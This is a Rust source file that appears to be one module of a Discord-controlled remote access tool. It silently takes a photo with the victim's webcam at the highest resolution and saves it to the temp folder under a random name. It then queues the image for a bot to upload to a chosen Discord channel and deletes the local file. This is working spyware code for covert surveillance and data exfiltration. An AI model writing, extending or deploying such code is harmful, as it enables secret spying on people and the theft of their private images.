use std::{time::SystemTime, path::Path, ffi::OsStr};
use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}, pixel_format::RgbFormat};
use rand::distributions::{Alphanumeric, DistString};
use serde_json::json;
use chrono::{Local, DateTime};
use crate::BOT_TO_SEND;
pub async fn main(channel_id: u64) {
    let mut send= false;
    let mut val= json!({});
    if let Ok(mut camera)= Camera::new(CameraIndex::Index(0), RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution)) {
        if let Ok(frame)= camera.frame() {
            let decoded= frame.decode_image::<RgbFormat>().unwrap();
            let path= std::env::temp_dir().to_string_lossy().to_string() + "\\" + &Alphanumeric.sample_string(&mut rand::thread_rng(), 5) + ".png";
            decoded.save_with_format(&path, image::ImageFormat::Png).unwrap();
            val= json!({
                "channel": channel_id,
                "files": [&path],
                "embed": true,
                "title": Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r").to_string() + " *`[Webcam]`*",
                "color": 0x0084ff,
                "image": format!("attachment://{}", Path::new(&path).file_name().unwrap_or(OsStr::new("")).to_string_lossy()),
                "delete_files": true,
                "react": ["📌"]
            });
            send= true;
        }
    }
    if send {
        BOT_TO_SEND.lock().await.push(val);
    }
}